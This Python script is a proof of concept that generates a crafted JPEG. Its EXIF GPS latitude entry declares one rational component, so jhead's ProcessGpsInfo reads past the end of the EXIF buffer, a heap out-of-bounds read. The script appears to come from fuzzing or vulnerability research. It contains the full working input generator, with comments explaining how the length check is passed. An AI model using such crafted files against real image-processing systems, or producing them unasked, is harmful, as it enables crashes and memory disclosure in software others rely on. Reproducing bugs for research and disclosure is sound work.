#!/usr/bin/env python3
"""
VULN 001 - GPS LAT/LONG Heap OOB Read via Components < 3
CVE: CWE-125 (Out-of-bounds Read)

ProcessGpsInfo() loops unconditionally 3 times for TAG_GPS_LAT/TAG_GPS_LONG,
but never checks that Components >= 3.  With Components=1 and ByteCount=8,
the boundary check (OffsetVal+ByteCount <= ExifLength) passes, yet iterations
a=1 and a=2 access memory past the end of the EXIF buffer.

Layout (all offsets relative to TIFF header start):
  [0-7]   TIFF header (II, 0x002A, IFD0_offset=8)
  [8-25]  IFD0:  1 entry  (GPS IFD pointer: tag=0x8825, format=LONG, val=26)
  [26-79] GPS IFD: 4 entries + next-IFD
           de=0  LatRef  (tag=0x0001, ASCII,    comps=2, inline "N\0\0\0")
           de=1  Lat     (tag=0x0002, URATIONAL, comps=1 <-- vuln, offset=104)
           de=2  LonRef  (tag=0x0003, ASCII,    comps=2, inline "E\0\0\0")
           de=3  Lon     (tag=0x0004, URATIONAL, comps=3, offset=80)
  [80-103] Lon rational data  (3 * 8 = 24 bytes)
  [104-111] Lat rational data (1 * 8 =  8 bytes) <- at ExifLength-8
"""

import struct, os

OUT = "/data/ylwang/non-textfuzz/target/_poc/jhead/gpsinfo_c/vuln_001_input.jpg"

# -----------------------------------------------------------------------
# TIFF constants (little-endian "II")
# -----------------------------------------------------------------------
FMT_ASCII    = 2
FMT_LONG     = 4
FMT_URATIONAL = 5

# BytesPerFormat[5] = 8
BYTES_PER_URATIONAL = 8

# -----------------------------------------------------------------------
# Layout constants
# -----------------------------------------------------------------------
TIFF_HDR_SIZE   = 8
IFD0_OFFSET     = 8          # TIFF header points here
IFD0_ENTRIES    = 1
IFD0_SIZE       = 2 + IFD0_ENTRIES * 12 + 4   # 18 bytes

GPS_IFD_OFFSET  = IFD0_OFFSET + IFD0_SIZE      # = 26
GPS_IFD_ENTRIES = 4
GPS_IFD_SIZE    = 2 + GPS_IFD_ENTRIES * 12 + 4 # = 54

DATA_START      = GPS_IFD_OFFSET + GPS_IFD_SIZE # = 80

LON_DATA_OFFSET = DATA_START                    # = 80  (3 * 8 = 24 bytes)
LAT_DATA_OFFSET = DATA_START + 24               # = 104 (1 * 8 = 8 bytes)

EXIF_LENGTH     = LAT_DATA_OFFSET + 8           # = 112

# KEY: OffsetVal + ByteCount = 104 + 8 = 112 = ExifLength  -> boundary check PASSES
# But the loop reads up to ValuePtr+23 (a=2, ConvertAnyFormat reads 8 bytes),
# which is OffsetBase+127, i.e., 15 bytes past ExifLength.

assert LAT_DATA_OFFSET == EXIF_LENGTH - 8, "placement invariant"

# -----------------------------------------------------------------------
# Build TIFF data (little-endian throughout)
# -----------------------------------------------------------------------
def ifd_entry(tag, fmt, components, value_or_offset):
    """Pack a 12-byte IFD entry."""
    return struct.pack('<HHII', tag, fmt, components, value_or_offset)

tiff = bytearray()

# TIFF header
tiff += b'II'                                      # little-endian mark
tiff += struct.pack('<H', 0x002A)                   # magic
tiff += struct.pack('<I', IFD0_OFFSET)              # IFD0 offset = 8

# IFD0
tiff += struct.pack('<H', IFD0_ENTRIES)             # 1 entry
tiff += ifd_entry(0x8825, FMT_LONG, 1, GPS_IFD_OFFSET)  # GPS IFD pointer
tiff += struct.pack('<I', 0)                        # next IFD = 0

assert len(tiff) == GPS_IFD_OFFSET, f"expected GPS_IFD at {GPS_IFD_OFFSET}, got {len(tiff)}"

# GPS IFD
tiff += struct.pack('<H', GPS_IFD_ENTRIES)          # 4 entries

# de=0  LatRef  tag=0x0001  ASCII  2 components  "N\x00" inline
lat_ref_val = struct.unpack('<I', b'N\x00\x00\x00')[0]
tiff += ifd_entry(0x0001, FMT_ASCII, 2, lat_ref_val)

# de=1  Lat     tag=0x0002  URATIONAL  1 component  offset=LAT_DATA_OFFSET
#       VULNERABILITY: loop iterates 3x but only 1 component is declared
tiff += ifd_entry(0x0002, FMT_URATIONAL, 1, LAT_DATA_OFFSET)

# de=2  LonRef  tag=0x0003  ASCII  2 components  "E\x00" inline
lon_ref_val = struct.unpack('<I', b'E\x00\x00\x00')[0]
tiff += ifd_entry(0x0003, FMT_ASCII, 2, lon_ref_val)

# de=3  Lon     tag=0x0004  URATIONAL  3 components  offset=LON_DATA_OFFSET
tiff += ifd_entry(0x0004, FMT_URATIONAL, 3, LON_DATA_OFFSET)

tiff += struct.pack('<I', 0)                        # next GPS IFD = 0

assert len(tiff) == DATA_START, f"expected data at {DATA_START}, got {len(tiff)}"

# Longitude data: 3 rationals (num/den each 4 bytes)
# degrees=10, minutes=0, seconds=0
tiff += struct.pack('<II', 10, 1)   # 10/1 degrees
tiff += struct.pack('<II', 0, 1)    # 0/1 minutes
tiff += struct.pack('<II', 0, 1)    # 0/1 seconds

assert len(tiff) == LAT_DATA_OFFSET, f"expected lat data at {LAT_DATA_OFFSET}, got {len(tiff)}"

# Latitude data: 1 rational placed at ExifLength-8 (last 8 bytes of TIFF)
tiff += struct.pack('<II', 40, 1)   # 40/1 degrees

assert len(tiff) == EXIF_LENGTH, f"expected ExifLength={EXIF_LENGTH}, got {len(tiff)}"

# -----------------------------------------------------------------------
# Build JPEG
# -----------------------------------------------------------------------
exif_payload = b'Exif\x00\x00' + bytes(tiff)

# APP1 length field: length of (length field itself + exif_payload)
app1_len = 2 + len(exif_payload)    # 2 bytes for the length field itself
assert app1_len == 120, f"app1_len={app1_len}"

jpeg  = b'\xff\xd8'                             # SOI
jpeg += b'\xff\xe1'                             # APP1 marker
jpeg += struct.pack('>H', app1_len)             # APP1 length (big-endian)
jpeg += exif_payload
jpeg += b'\xff\xd9'                             # EOI

os.makedirs(os.path.dirname(OUT), exist_ok=True)
with open(OUT, 'wb') as f:
    f.write(jpeg)

print(f"Written {len(jpeg)} bytes to {OUT}")
print(f"  EXIF_LENGTH = {EXIF_LENGTH}")
print(f"  LAT_DATA_OFFSET = {LAT_DATA_OFFSET}  (= ExifLength - 8)")
print(f"  Boundary check: {LAT_DATA_OFFSET} + 8 = {LAT_DATA_OFFSET+8} <= {EXIF_LENGTH}  -> PASSES")
print(f"  Loop a=1 reads at offset {LAT_DATA_OFFSET+8} (OOB!)")
print(f"  Loop a=2 reads at offset {LAT_DATA_OFFSET+16} (OOB!)")
